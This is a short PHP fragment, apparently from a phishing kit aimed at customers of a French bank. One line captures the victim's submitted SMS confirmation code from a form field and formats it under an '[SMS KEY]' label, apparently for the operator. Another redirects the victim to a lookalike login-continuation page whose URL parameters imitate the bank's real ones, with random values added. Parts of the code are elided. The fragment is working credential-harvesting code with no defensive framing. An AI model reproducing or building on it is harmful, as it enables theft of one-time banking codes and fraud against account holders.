...
<font style='color:#00049c;'>🤑✪</font> [SMS KEY] = <font style='color:#ba0000;'>".$_POST['confirmacion']."</font><br>
...
HEADER("Location: ../tow_continuar.php?assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
